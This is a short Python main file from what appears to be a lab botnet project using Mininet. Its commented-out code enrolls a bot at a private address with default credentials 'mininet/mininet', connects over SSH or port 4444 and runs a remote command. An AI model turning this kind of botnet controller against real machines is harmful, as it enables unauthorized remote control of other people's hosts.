from Botnet.BotOperation import BotOperation


def main():
    """botnet = BotNet()
    mininetBot = Bot("mininetbot", "192.168.1.101", "mininet", "mininet", 22)
    mininetBot.SSHconnect()
    botnet.addbot(mininetBot)

    stdin, stdout, stderr = mininetBot.sshbot_client.exec_command("ls")
    print(stdout.readlines())

    print(botnet.botnet)"""

    # create [mininetbot, 192.168.1.118, mininet, mininet, 22]
    # create [mininetbot, 192.168.1.118, mininet, mininet, 4444]

    # botnet = BotNet()
    # mininetBot = Bot("mininetbot", "192.168.1.101", "mininet", "mininet", 4444)
    # botnet.addbot(mininetBot)
    # mininetBot.connect()

    # print(stdout.readlines())

    # print(botnet.botnet)

    BotOp = BotOperation()


if __name__ == '__main__':
    main()
